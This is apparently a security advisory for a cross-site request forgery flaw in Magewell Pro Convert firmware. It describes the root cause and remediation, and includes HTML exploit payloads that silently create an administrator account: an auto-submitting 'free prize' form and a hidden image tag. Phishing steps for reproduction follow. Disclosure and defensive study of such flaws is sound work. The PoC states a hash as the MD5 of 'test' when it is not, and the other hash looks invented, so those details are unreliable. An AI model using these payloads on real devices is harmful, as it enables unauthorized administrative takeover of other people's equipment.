# CVE-2025-63952 - Magewell Pro Convert CSRF Vulnerability

## Description

A Cross-Site Request Forgery (CSRF) vulnerability in the `/mwapi?method=add-user` endpoint of **Magewell Pro Convert v1.2.213** allows remote attackers to arbitrarily create administrative user accounts via a crafted GET request.

## Vendor Information

- **Vendor**: Magewell  
- **Vendor Homepage**: https://www.magewell.com  
- **Affected Product**: Pro Convert  
- **Affected Version**: Firmware v1.2.213  

## Vulnerability Details

- **Vulnerable Endpoint**:  
  `http://<device-ip>/mwapi?method=add-user`
  
- **Attack Type**: Remote  
- **Vector**: Cross-Site Request Forgery (CSRF) via GET request  
- **Root Cause**:  
  The endpoint performs a state-changing operation (user creation) using HTTP GET without:
  - CSRF token validation
  - Origin/Referer header checks
  - HTTP method restriction (allows GET instead of requiring POST)

An attacker can trigger account creation by tricking an authenticated administrator into visiting a malicious page that issues a cross-origin request (e.g., via `<img src>`, hidden `<iframe>`, auto-submitting form, or phishing link).

## Impact

| Category                  | Description                                                                 |
|---------------------------|-----------------------------------------------------------------------------|
| **Integrity**             | Unauthorized creation or modification of user accounts                      |
| **Privilege Escalation**  | Ability to create admin accounts (`is-admin=1`) â†’ full device compromise   |
| **Persistence**           | Attacker gains persistent administrative access                            |
| **Business/Operational**  | Risk of data exfiltration, lateral movement, sabotage, or covert monitoring |

**CVSS v3.1 Base Score (estimated)**: **8.8 (High)**  
`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`

## Proof of Concept (PoC)

```html
<html>
  <body>
    <h1>Click anywhere to claim your free prize!</h1>
    <form id="exploit" method="GET" action="http://127.0.0.1/mwapi">
      <input type="hidden" name="method" value="add-user" />
      <input type="hidden" name="id" value="omar" />
      <input type="hidden" name="pass" value="d4466cce49457cfea18222f5a7cd3573" /> <!-- MD5 of "test" -->
      <input type="hidden" name="is-admin" value="1" />
    </form>
    <script>
      document.getElementById("exploit").submit();
    </script>
  </body>
</html>
```

Alternative one-liner (no user interaction required):

```html
<img src="http://192.168.1.100/mwapi?method=add-user&id=hacker&pass=5e9f4c7d7f7e6e8b0d8f8a0b1c2d3e4f&is-admin=1" width="1" height="1" style="display:none">
```

## Steps to Reproduce

1. Ensure the target Magewell Pro Convert device is running firmware **v1.2.213**.
2. Log in to the web interface as an administrator (victim must have an active session).
3. Host the malicious HTML page above on an attacker-controlled web server.
4. Trick the administrator into visiting the page (e.g., via phishing email, forum link, etc.).
5. The victim's browser automatically sends the forged request using the existing session.
6. A new administrative user (e.g., `omar:test`) is created on the device.

---

## poc video 

https://github.com/user-attachments/assets/a692dc79-6aca-4fd2-a4e5-57c8c7674b8d

--- 

## Remediation

- Upgrade to a firmware version that addresses this vulnerability (contact Magewell for the latest secure release).
- Implement proper CSRF protections:
  - Use anti-CSRF tokens
  - Enforce POST for state-changing operations
  - Validate Origin/Referer headers
- Restrict access to the management interface (e.g., disable remote access or place behind VPN).

## References

- Magewell Official Website: https://www.magewell.com
- CVE Record: CVE-2025-63952

## Discovered by Mohamed Shahat (shiky8), Iyad Alkhatib (Hack4fun)

